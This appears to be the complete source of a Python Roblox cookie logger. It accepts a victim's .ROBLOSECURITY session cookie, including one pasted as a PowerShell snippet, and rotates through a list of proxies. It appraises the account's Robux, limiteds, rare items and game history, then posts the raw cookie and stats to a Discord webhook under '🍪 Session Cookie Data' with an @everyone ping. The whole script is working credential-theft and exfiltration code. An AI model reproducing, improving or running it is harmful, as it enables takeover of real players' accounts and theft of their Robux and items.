import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

# Your proxy list for Render bypass
RAW_PROXY_LIST = """
socks5://213.165.54.5:1080
socks4://46.8.104.176:1080
http://5.129.254.243:8888
http://5.129.254.49:8888
socks5://93.100.82.163:1080
socks5://80.79.241.118:1080
socks5://185.9.73.44:1080
socks5://46.161.49.174:10808
http://5.129.254.51:8888
http://5.129.254.154:8888
http://5.129.254.60:8888
http://147.45.164.178:8888
socks5://77.91.108.85:1080
http://5.129.254.129:8888
http://5.129.254.5:8888
socks5://217.69.222.174:1080
http://5.129.254.215:8888
socks5://83.234.87.145:1080
socks5://82.142.130.102:1080
http://20.52.234.254:3128
"""

SPECIAL_ASSETS = {
    "Korblox": 139607718,
    "Headless": 134082579,
    "Violet Valk": 1402432199,
}

# Note: The universe ID is NOT the number in the game's URL (that's the place ID).
GAMES = {
    "Adopt Me": 383310974,
    "MM2": 142823291,
    "PS99": 3259657279,
}

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    return cookie.lstrip('.').rstrip(';').strip()

def get_working_session(roblosecurity):
    # SPEED FIX 1: Single requests.Session() for every request so connections are reused
    session = requests.Session()
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com/"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []
    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            # Endpoint: GET https://users.roblox.com/v1/users/authenticated
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
            if test_res.status_code != 429:
                return session, test_res
        except Exception:
            continue

    session.proxies = {}
    # Endpoint: GET https://users.roblox.com/v1/users/authenticated
    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
    return session, fallback_res

def api_get(session, url, **kwargs):
    """
    SPEED FIX 5: Remove fixed 0.3s sleep. Only sleep when a 429 happens: 
    retry up to 3 times with increasing backoff (1.5s, 3s, 4.5s).
    RELIABILITY: Distinguish a failed request from a real zero. Returns status and parsed data or error.
    """
    backoffs = [1.5, 3.0, 4.5]
    for attempt in range(4): # Initial attempt + 3 retries
        try:
            # SPEED FIX 1: timeout=10 on each call
            r = session.get(url, timeout=10, **kwargs)
            if r.status_code == 429:
                if attempt < 3:
                    time.sleep(backoffs[attempt])
                    continue
                return {"status": 429, "error": "rate_limited"}
            if r.status_code == 403:
                return {"status": 403, "error": "forbidden"}
            if r.status_code == 200:
                try:
                    # RELIABILITY: Wrap JSON parsing in try/except
                    return {"status": 200, "data": r.json()}
                except ValueError:
                    return {"status": 200, "error": "bad_json"}
            return {"status": r.status_code, "error": "http_error"}
        except Exception as e:
            if attempt < 3:
                time.sleep(1.0)
                continue
            return {"status": 500, "error": str(e)}
    return {"status": 500, "error": "max_retries_exceeded"}

def startup_universe_check(session, games_dict):
    """
    RELIABILITY: Startup check that calls games.roblox.com/v1/games?universeIds=... 
    for universe IDs and prints each ID with its game name, warning if an ID returns nothing.
    """
    u_ids = list(games_dict.values())
    ids_str = ",".join(map(str, u_ids))
    # Endpoint: GET https://games.roblox.com/v1/games
    res = api_get(session, f"https://games.roblox.com/v1/games?universeIds={ids_str}")
    if res and res.get("status") == 200:
        data = res["data"].get("data", [])
        found_ids = {g["id"] for g in data}
        for name, uid in games_dict.items():
            if uid in found_ids:
                for g in data:
                    if g["id"] == uid:
                        print(f"Startup Check Verified: Universe ID {uid} -> {g['name']}", file=sys.stderr)
            else:
                print(f"WARNING: Universe ID {uid} ({name}) returned nothing from Roblox API!", file=sys.stderr)
    else:
        print("WARNING: Startup universe check request failed.", file=sys.stderr)

def get_all_owned_gamepasses(session, user_id):
    """
    SPEED FIX 2: Fetch ALL owned gamepasses ONCE (inventory.roblox.com/v2/users/{id}/inventory/34, 
    paginated, limit 100, follow nextPageCursor) and store asset IDs in a set.
    RELIABILITY: If request returns 403, return "inventory private". If failed, return None.
    """
    owned_set = set()
    cursor = ""
    while True:
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        # Endpoint: GET https://inventory.roblox.com/v2/users/{id}/inventory/34
        res = api_get(session, f"https://inventory.roblox.com/v2/users/{user_id}/inventory/34", params=params)
        if res and res.get("status") == 403:
            return "inventory private"
        if not res or res.get("status") != 200:
            return None
        
        data = res["data"]
        for item in data.get("data", []):
            asset_id = item.get("assetId") or item.get("id") or item.get("itemDetails", {}).get("id")
            if asset_id:
                try:
                    owned_set.add(int(asset_id))
                except ValueError:
                    pass
        
        cursor = data.get("nextPageCursor")
        if not cursor:
            break
    return owned_set

def process_single_game(session, user_id, game_name, universe_id, owned_gamepasses_set):
    """
    SPEED FIX 2 & 3 & 4: Worker function to process a single game concurrently.
    - Count overlap with set intersection locally.
    - Check badges against awarded-dates in chunks of 100, stopping at the FIRST chunk returning an awarded badge.
    - If owned gamepasses > 0, skip badge check entirely and mark played.
    RELIABILITY: Distinguish errors from zero/false by returning "error" string when requests fail.
    """
    played = False
    owned_passes_count = "error"

    # 1. Fetch game's gamepasses (paginated)
    game_passes = []
    cursor = ""
    passes_failed = False
    while True:
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        # Endpoint: GET https://games.roblox.com/v1/games/{universeId}/game-passes
        res = api_get(session, f"https://games.roblox.com/v1/games/{universe_id}/game-passes", params=params)
        if not res or res.get("status") != 200:
            passes_failed = True
            break
        data = res["data"]
        for p in data.get("data", []):
            pid = p.get("id")
            if pid:
                game_passes.append(int(pid))
        cursor = data.get("nextPageCursor")
        if not cursor:
            break

    if not passes_failed and isinstance(owned_gamepasses_set, set):
        # SPEED FIX 2: Count overlap with set intersection locally
        overlap = set(game_passes).intersection(owned_gamepasses_set)
        owned_passes_count = len(overlap)
        if owned_passes_count > 0:
            played = True
    elif owned_gamepasses_set == "inventory private":
        owned_passes_count = "inventory private"
    else:
        owned_passes_count = "error"

    # 2. For "played", check badges if not already marked played by gamepasses
    if not played and owned_passes_count != "error":
        badge_ids = []
        cursor = ""
        badges_failed = False
        while True:
            params = {"limit": 100}
            if cursor:
                params["cursor"] = cursor
            # Endpoint: GET https://badges.roblox.com/v1/universes/{universeId}/badges
            res = api_get(session, f"https://badges.roblox.com/v1/universes/{universe_id}/badges", params=params)
            if not res or res.get("status") != 200:
                badges_failed = True
                break
            data = res["data"]
            for b in data.get("data", []):
                bid = b.get("id")
                if bid:
                    badge_ids.append(bid)
            cursor = data.get("nextPageCursor")
            if not cursor:
                break

        if badges_failed:
            played = "error"
        elif badge_ids:
            # SPEED FIX 3: Check against /v1/users/{id}/badges/awarded-dates in chunks of 100 IDs. Stop at the FIRST chunk.
            for i in range(0, len(badge_ids), 100):
                chunk = badge_ids[i:i + 100]
                # Endpoint: GET https://badges.roblox.com/v1/users/{userId}/badges/awarded-dates
                res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges/awarded-dates", params={"badgeIds": ",".join(map(str, chunk))})
                if res and res.get("status") == 200:
                    if res["data"].get("data"):
                        played = True
                        break
                else:
                    played = "error"
                    break

    return game_name, played, owned_passes_count

def main():
    start_time = time.time()
    try:
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No cookie provided in sys.argv[1]", file=sys.stderr)
            sys.exit(1)
        
        raw_arg = sys.argv[1]
        roblosecurity = extract_and_clean_cookie(raw_arg)

        session, auth_res = get_working_session(roblosecurity)
        print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
        
        if auth_res.status_code in (401, 403):
            print("Error: Invalid, expired, or unauthorized cookie (401/403).", file=sys.stderr)

        user_id = None
        username = "Unknown User"
        display_name = "Unknown"
        age_days = "error"
        robux = "error"
        pending = "error"
        rap = "error"
        lim_count = "error"
        premium = "error"
        gamepasses_bought = "error"
        email_ver = False
        twofa = False
        games_data = {}
        special_owned = {}

        if auth_res.status_code == 200:
            auth_data = auth_res.json()
            user_id = auth_data.get("id")
            if user_id:
                username = auth_data.get("name", "Unknown")
                display_name = auth_data.get("displayName", username)

                # Run startup check for universe IDs validation
                startup_universe_check(session, GAMES)

                # Account info & Creation date
                # Endpoint: GET https://users.roblox.com/v1/users/{userId}
                u_res = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
                if u_res and u_res.get("status") == 200:
                    created = u_res["data"].get("created", "")
                    if created:
                        try:
                            age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
                        except Exception:
                            pass

                # Robux balance
                # Endpoint: GET https://economy.roblox.com/v1/user/currency
                curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
                if curr_res and curr_res.get("status") == 200:
                    robux = curr_res["data"].get("robux", 0)

                # Pending robux
                # Endpoint: GET https://economy.roblox.com/v2/users/{userId}/transaction-totals
                trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
                if trans_res and trans_res.get("status") == 200:
                    pending = trans_res["data"].get("pendingRobuxTotal", 0)

                # Premium status
                # Endpoint: GET https://premiumfeatures.roblox.com/v1/users/{userId}/validate-membership
                prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
                if prem_res and prem_res.get("status") == 200:
                    val = prem_res["data"]
                    if isinstance(val, bool):
                        premium = val
                    elif isinstance(val, dict):
                        premium = val.get("isMember", False)

                # Collectibles & RAP (paginated)
                collectibles = []
                cursor = ""
                col_failed = False
                while True:
                    params = {"limit": 100, "sortOrder": "Asc"}
                    if cursor:
                        params["cursor"] = cursor
                    # Endpoint: GET https://inventory.roblox.com/v1/users/{userId}/assets/collectibles
                    res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params=params)
                    if res and res.get("status") == 403:
                        collectibles = "inventory private"
                        break
                    if not res or res.get("status") != 200:
                        col_failed = True
                        break
                    data = res["data"]
                    collectibles += data.get("data", [])
                    cursor = data.get("nextPageCursor")
                    if not cursor:
                        break
                
                if collectibles == "inventory private":
                    lim_count = "inventory private"
                    rap = "inventory private"
                elif col_failed:
                    lim_count = "error"
                    rap = "error"
                else:
                    lim_count = len(collectibles)
                    rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)

                # Gamepasses bought total count
                try:
                    gp_count = 0
                    t_cursor = ""
                    t_failed = False
                    while True:
                        t_params = {"transactionType": "Purchase", "limit": 100}
                        if t_cursor:
                            t_params["cursor"] = t_cursor
                        # Endpoint: GET https://economy.roblox.com/v2/users/{userId}/transactions
                        t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params=t_params)
                        if not t_res or t_res.get("status") != 200:
                            t_failed = True
                            break
                        t_body = t_res["data"]
                        for item in t_body.get("data", []):
                            details = item.get("details")
                            if details and details.get("type") == "GamePass":
                                gp_count += 1
                        t_cursor = t_body.get("nextPageCursor")
                        if not t_cursor:
                            break
                    gamepasses_bought = "error" if t_failed else gp_count
                except Exception:
                    gamepasses_bought = "error"

                # Special items ownership check
                for item_name, asset_id in SPECIAL_ASSETS.items():
                    # Endpoint: GET https://inventory.roblox.com/v1/users/{userId}/items/Asset/{assetId}
                    asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
                    if asset_res and asset_res.get("status") == 200:
                        special_owned[item_name] = bool(asset_res["data"].get("data"))
                    else:
                        special_owned[item_name] = "error"

                # Fetch all owned gamepasses ONCE for set intersection optimization
                owned_gamepasses = get_all_owned_gamepasses(session, user_id)

                # SPEED FIX 4: Run the games in parallel with ThreadPoolExecutor(max_workers=3), one thread per game
                with ThreadPoolExecutor(max_workers=3) as executor:
                    futures = {
                        executor.submit(process_single_game, session, user_id, g_name, u_id, owned_gamepasses): g_name
                        for g_name, u_id in GAMES.items()
                    }
                    for future in as_completed(futures):
                        try:
                            g_name, played, passes_count = future.result()
                            games_data[g_name] = {"played": played, "passes": passes_count}
                        except Exception:
                            g_name = futures[future]
                            games_data[g_name] = {"played": "error", "passes": "error"}

        # Safe formatting for display strings
        robux_display = f"{robux:,}" if isinstance(robux, int) else str(robux)
        pending_display = f"{pending:,}" if isinstance(pending, int) else str(pending)
        rap_display = f"{rap:,}" if isinstance(rap, int) else str(rap)

        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
        
        games_str = "\n".join([f"- {g}: {d['played']} ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
        special_str = "\n".join([f"+ {name}: {owned}" for name, owned in special_owned.items()]) if special_owned else "N/A"

        embed_stats = {
            "title": "📢 Discord Notification 📢",
            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
            "color": 0x2B2D31,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Total Passes Bought: {gamepasses_bought}\n+ Premium: {premium}\n```", "inline": False},
                {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux_display}\nPending: {pending_display}\n```", "inline": True},
                {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap_display}\nLimiteds: {lim_count}\n```", "inline": True},
                {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
                {"name": "⭐ Games", "value": f"```diff\n{games_str}\n```", "inline": False}
            ],
            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        embed_cookie = {
            "title": "🍪 Session Cookie Data",
            "description": f"```text\n{roblosecurity}\n```",
            "color": 0x2B2D31,
            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
        }

        payload = {
            "content": "@everyone",
            "username": f"{display_name} | Stats",
            "avatar_url": avatar_url,
            "embeds": [embed_stats, embed_cookie],
            "allowed_mentions": {
                "parse": ["everyone"]
            }
        }

        requests.post(webhook_url, json=payload, timeout=10)

        # OUTPUT: Timing output at the end ("finished in X.Xs")
        elapsed_time = time.time() - start_time
        print(f"finished in {elapsed_time:.1f}s", file=sys.stderr)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
